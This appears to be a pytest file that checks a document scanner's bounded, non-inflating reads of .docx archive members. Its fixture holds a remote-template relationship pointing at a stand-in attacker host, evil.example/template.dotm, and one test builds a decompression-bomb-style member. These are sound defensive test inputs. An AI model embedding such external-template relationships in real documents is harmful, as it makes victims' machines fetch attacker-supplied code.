"""F-05 — archive inspection must never decompress a member unboundedly.

The zip-bomb findings reason about declared sizes, but the .rels
inspection used to `zf.read()` a member whole: one entry declaring
just under the 500 MB aggregate ceiling would be inflated straight
into RAM. Member content is now consumed only through a bounded stream
read (256 KiB), and oversized members are skipped entirely.
"""

import io
import zipfile

from app.modules.file_scanner import MAX_MEMBER_READ, scan_file

RELS = "word/_rels/document.xml.rels"
MARKER = (
    '<Relationship Type="http://schemas.openxmlformats.org/officeDocument/'
    '2006/relationships/attachedTemplate" TargetMode="External" '
    'Target="https://evil.example/template.dotm"/>'
)


def _zip_with_rels(rels_bytes: bytes) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(RELS, rels_bytes)
        zf.writestr("word/document.xml", "<w:document/>")
    return buf.getvalue()


def _codes(result):
    return {f["code"] for f in result["findings"]}


def test_small_external_template_rels_still_flagged():
    # Behaviour preserved: a normal-sized malicious .rels is caught.
    result = scan_file("doc.docx", _zip_with_rels(MARKER.encode()))
    assert "remote-template" in _codes(result)


def test_oversized_rels_member_is_never_read():
    # Marker sits at the START of a member far beyond the read cap.
    # If the scanner read the member, it would flag remote-template;
    # the member must instead be skipped wholesale.
    payload = MARKER.encode() + b"A" * (MAX_MEMBER_READ * 4)
    result = scan_file("doc.docx", _zip_with_rels(payload))
    assert "remote-template" not in _codes(result)


def test_marker_beyond_the_read_cap_is_not_seen():
    # Marker placed after the cap inside an under-cap member cannot be
    # smuggled into the inspected prefix either (bounded stream read).
    payload = b"A" * (MAX_MEMBER_READ + 1024) + MARKER.encode()
    # Declared size exceeds the cap, so this is also skipped — either
    # way the finding must not fire from beyond the bound.
    result = scan_file("doc.docx", _zip_with_rels(payload))
    assert "remote-template" not in _codes(result)


def test_highly_compressible_member_does_not_inflate_scan():
    # 64 MB of zeros compresses to ~64 KB; the scan must complete and
    # stay a normal archive result (no crash, no remote-template).
    payload = b"\x00" * (64 * 1024 * 1024)
    result = scan_file("doc.docx", _zip_with_rels(payload))
    assert result["filename"] == "doc.docx"
    assert "remote-template" not in _codes(result)
